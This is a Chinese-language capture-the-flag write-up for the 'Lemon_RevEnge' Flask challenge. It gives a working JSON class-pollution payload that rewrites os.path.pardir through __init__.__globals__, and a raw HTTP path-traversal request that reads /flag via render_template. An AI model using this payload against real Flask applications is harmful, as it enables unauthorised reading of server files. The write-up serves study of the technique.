# Lemon_RevEnge

## 题目简述

Flask 应用把客户端 JSON 递归合并到全局 `Dst` 实例。`merge()` 既能操作字典，也会沿对象属性继续递归，因此攻击者可以从实例访问类的 `__init__` 函数，再进入 `__globals__` 修改已导入模块的全局状态。另一路由把 URL 路径直接交给 `render_template(path)`，本应由 Jinja 的模板路径检查阻止 `../` 穿越。

## 解题过程

Python 函数对象的 `__globals__` 指向其定义模块的全局字典，其中包含 `os`。Jinja 拆分模板路径时以 `os.path.pardir` 判断路径片段是否为 `..`；把该常量从 `..` 污染为 `,`，即可让原有检查不再识别真正的父目录片段。

向根路由提交：

```json
{
  "__init__": {
    "__globals__": {
      "os": {
        "path": {
          "pardir": ","
        }
      }
    }
  }
}
```

污染成功后，必须用不会自动规范化路径的客户端发送原始请求，例如：

```http
GET /../../../../flag HTTP/1.1
Host: <host>
Connection: close
```

`os.path.exists("templates/" + path)` 对穿越后的 `/flag` 返回真，Jinja 的 `..` 检查又已失效，于是 `render_template()` 读取并返回 flag 文件。

## 方法总结

- 核心技巧：利用递归属性合并造成 Python 类污染，再篡改 Jinja 路径校验依赖的全局常量。
- 识别信号：不受限的 JSON-to-object merge、可达 `__init__.__globals__`，以及用户路径直接进入模板加载器。
- 复用要点：分析污染题时要寻找“可写全局状态”与“后续安全决策”的连接点；单独污染属性没有效果，必须说明被污染值如何改变下游逻辑。
